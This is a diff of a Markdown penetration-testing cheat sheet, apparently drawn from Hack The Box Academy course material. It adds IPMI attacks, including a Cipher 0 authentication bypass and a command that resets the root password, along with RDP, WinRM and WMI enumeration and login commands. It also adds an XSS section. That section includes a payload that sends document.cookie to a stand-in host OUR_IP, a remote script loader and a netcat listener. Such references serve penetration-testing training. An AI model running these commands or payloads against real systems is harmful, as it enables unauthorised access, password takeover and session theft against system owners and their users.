@@ -1,13 +1,13 @@
 
 
-## Infrastructure-based Enumeration
+##  Infrastructure-based Enumeration
 
 | **Command**                                                         | **Description**                              |
 | ------------------------------------------------------------------- | -------------------------------------------- |
 | `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency.                    |
 | `for i in $(cat ip-addresses.txt);do shodan host $i;done`           | Scan each IP address in a list using Shodan. |
 
-## Host-based Enumeration
+### Host-based Enumeration
 
 ##### FTP
 
@@ -216,31 +216,6 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ```
 
 
-#### IPMI
-
-| **Command**                                    | **Description**         |
-| ---------------------------------------------- | ----------------------- |
-| `msf6 auxiliary(scanner/ipmi/ipmi_version)`    | IPMI version detection. |
-| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes.       |
-
-#### Linux Remote Management
-
-| **Command**                                                 | **Description**                                       |
-| ----------------------------------------------------------- | ----------------------------------------------------- |
-| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
-| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
-| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
-| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |
-
-#### Windows Remote Management
-
-| **Command**                                                   | **Description**                                 |
-| ------------------------------------------------------------- | ----------------------------------------------- |
-| `rdp-sec-check.pl <FQDN/IP>`                                  | Check the security settings of the RDP service. |
-| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`             | Log in to the RDP server from Linux.            |
-| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.                     |
-| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service.          |
-
 #### Oracle TNS
 
 | **Command**                                                                                                                  | **Description**                                                                                         |
@@ -249,4 +224,71 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 | `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                                       | Log in to the Oracle database.                                                                          |
 | `python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS.                                                                        |
 
-[Download Cheatsheet](https://academy.hackthebox.com/module/cheatsheet/112)
+
+#### IPMI
+
+| **Command**                                                                                            | **Description**                                                                                                                                         |
+| ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| nmap -n-sU -p 623 $ip/24                                                                               | Enumerate in a network range                                                                                                                            |
+| sudo nmap -sU --script ipmi* -p 623 $ip                                                                | Run all nmap scripts related to ipmi protocol                                                                                                           |
+| `msf6 auxiliary(scanner/ipmi/ipmi_version)`                                                            | IPMI version detection.                                                                                                                                 |
+| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`                                                         | Dump IPMI hashes. Similar to the The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack                                                 |
+| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H  $ip -U root -P root user list                 | **The IPMI Authentication Bypass via Cipher 0 attack**<br>Install ipmitool and use Cipher 0 to dump a list of users. With -C 0 any password is accepted |
+| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 | **The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack** <br>Install ipmitool and change the password of root                         |
+|                                                                                                        | **The IPMI Anonymous Authentication attack**                                                                                                            |
+
+### Linux Remote Management
+
+| **Command**                                                 | **Description**                                       |
+| ----------------------------------------------------------- | ----------------------------------------------------- |
+| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
+| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
+| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
+| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |
+
+### Windows Remote Management
+
+#### [RDP](3389-rdp.md)
+
+| **Command**                                                                                                      | **Description**                                                                                                                                                                                                                                                                  |
+| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| nmap -Pn -sV -p3389 --script rdp-*  $ip                                                                          | Footprinting RDP                                                                                                                                                                                                                                                                 |
+| git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check<br><br>./rdp-sec-check.pl $ip | A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes. |
+| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`                                                                | Log in to the RDP server from Linux.                                                                                                                                                                                                                                             |
+| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`                                                    | Execute command using the WMI service.                                                                                                                                                                                                                                           |
+
+
+#### [WinRM](5985-5986-winrm-windows-remote-management.md)
+
+| **Command**                                        | **Description**             |
+| -------------------------------------------------- | --------------------------- |
+| nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n | Footprinting WinRM          |
+| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`  | Log in to the WinRM server. |
+
+#### [WMI](135-windows-management-instrumentation-wmi.md)
+
+| **Command**                                                   | **Description**                        |
+| ------------------------------------------------------------- | -------------------------------------- |
+| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.            |
+| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |
+
+## XSS
+
+| Code                                                                                          | Description                       |
+| --------------------------------------------------------------------------------------------- | --------------------------------- |
+| **XSS Payloads**                                                                              |                                   |
+| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
+| `<plaintext>`                                                                                 | Basic XSS Payload                 |
+| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
+| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
+| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
+| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
+| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
+| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
+| **Commands**                                                                                  |                                   |
+| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
+| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
+| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
